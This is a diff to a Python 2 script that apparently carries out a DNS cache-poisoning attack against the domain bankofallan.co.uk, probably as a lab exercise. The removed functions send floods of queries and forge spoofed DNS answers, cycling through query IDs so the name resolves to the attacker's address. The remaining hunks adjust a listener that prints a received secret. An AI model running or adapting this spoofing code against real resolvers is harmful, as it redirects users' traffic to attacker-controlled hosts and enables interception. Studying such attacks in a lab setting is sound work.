@@ -35,8 +35,6 @@ def get_port():
 
 	socket_receive.close()
 
-
-
 	return (qid, src_port)
 
 
@@ -60,8 +58,7 @@ def listening(event):
 	print "Listening..."
 	while True:
 		data, address = final_socket.recvfrom(2048)
-		print data
-		print "Secret received:", data
+		print "Secret received! Here it is:", data
 		event.set()
 		break
 
@@ -98,41 +95,6 @@ def request_flooding_new():
 
 
 
-def request_flooding():
-	sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	sock_send.connect((DNS_IP, 53))
-
-	query = DNSRecord(DNSHeader(qr=1,aa=1,ra=1), q=DNSQuestion("random.bankofallan.co.uk"))
-	sock_send.send(query.pack())
-	data, addr = sock_send.recvfrom(2048)
-	data = DNSRecord.parse(data)
-
-	while True:
-		query = DNSRecord(DNSHeader(qr=1,aa=1,ra=1), q=DNSQuestion("random.bankofallan.co.uk"))
-		sock_send.send(query.pack())
-		data, addr = sock_send.recvfrom(2048)
-		data = DNSRecord.parse(data)
-		print "Requesting...QID: ", data.header.id
-		sleep(5)
-
-
-def answer_flooding(arguments):
-	#port = get_port()
-	qid, port, spoof_ip = arguments
-	sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	sock_send.bind((str(spoof_ip), 53))
-	sock_send.connect((DNS_IP, port))
-	i = 0
-	max = 2**16
-	range_ports = range(0, max)
-	while True:
-		q_id = (qid + i) % max
-		i += 1
-		query = DNSRecord(DNSHeader(qr=1,aa=1,ra=1,id=q_id), q=DNSQuestion("random.bankofallan.co.uk"))
-		answer = query.reply()
-		answer.add_answer(RR("random.bankofallan.co.uk",QTYPE.A,rdata=A(UDP_IP),ttl=4800))
-		sock_send.send(answer.pack())
-		#print "Trying QID %s..." % q_id
 
 
 
@@ -157,4 +119,4 @@ if __name__=="__main__":
 			print "Done..."
 			for i in list:
 				i.terminate()
-			sys.exit(1)
+		break
